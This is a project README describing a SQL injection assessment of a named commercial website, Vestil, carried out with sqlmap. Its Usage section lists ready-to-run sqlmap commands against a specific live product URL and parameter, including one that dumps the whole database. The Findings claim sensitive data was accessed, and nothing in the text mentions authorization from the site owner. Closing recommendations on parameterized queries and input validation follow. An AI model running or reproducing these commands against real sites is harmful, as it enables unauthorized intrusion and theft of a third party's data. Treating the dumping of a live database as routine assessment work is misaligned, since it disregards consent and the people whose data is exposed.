# SQL Injection Vulnerability Assessment

## Overview

This project involves assessing SQL injection vulnerabilities within the Vestil website. The assessment aims to identify and exploit SQL injection points to highlight their impact on database security.

## Purpose

- **Identify Vulnerabilities**: Detected SQL injection weaknesses in the Vestil website.
- **Exploit Vulnerabilities**: Demonstrated how these vulnerabilities can be exploited.
- **Mitigate Risks**: Provided recommendations to improve security.

## Technologies Used

- **Kali Linux**: A Linux distribution for penetration testing.
- **SQLmap**: A tool for automated SQL injection detection and exploitation.

## Setup and Installation

   **Clone the Repository**

   ```bash
   git clone https://github.com/yourusername/sql-injection-vulnerability-assessment.git
   sudo apt-get install sqlmap
   cd sql-injection-vulnerability-assessment
  ```

## Usage

Providing a step-by-step guide on how to use the tools and perform the assessment.

1. **Initial Reconnaissance**

   Identify potential SQL injection points by manipulating URL parameters on the Vestil website.

2. **Run SQLmap**

   Use SQLmap to detect SQL injection vulnerabilities:

   ```bash
   sqlmap -u "https://www.vestil.com/product.php?FID=1430" --dbs
   sqlmap -u "https://www.vestil.com/product.php?FID=1430" --tables
   sqlmap -u "https://www.vestil.com/product.php?FID=1430" --dump-all

## Findings

- **Vulnerabilities Identified**: Several SQL injection points were discovered, allowing access to sensitive data in the MySQL database.
- **Impact**: These vulnerabilities could lead to unauthorized data access, theft, manipulation, and significant reputational damage.

## Recommendations

- **Use Parameterized Queries**: Prevent SQL injection by using parameterized queries.
- **Sanitize Input**: Validate and sanitize all user inputs to block malicious data.
- **Prepared Statements**: Implement prepared statements to avoid injection.
- **Access Controls**: Enforce strong authentication and access controls for the database.
- **Monitoring**: Set up alerts for unusual database activity.

## Contributions

This project was completed individually. Contributions included:
- Identifying and exploiting SQL injection vulnerabilities.
- Utilizing SQLmap for detection and data extraction.
- Documenting findings and recommendations for remediation.





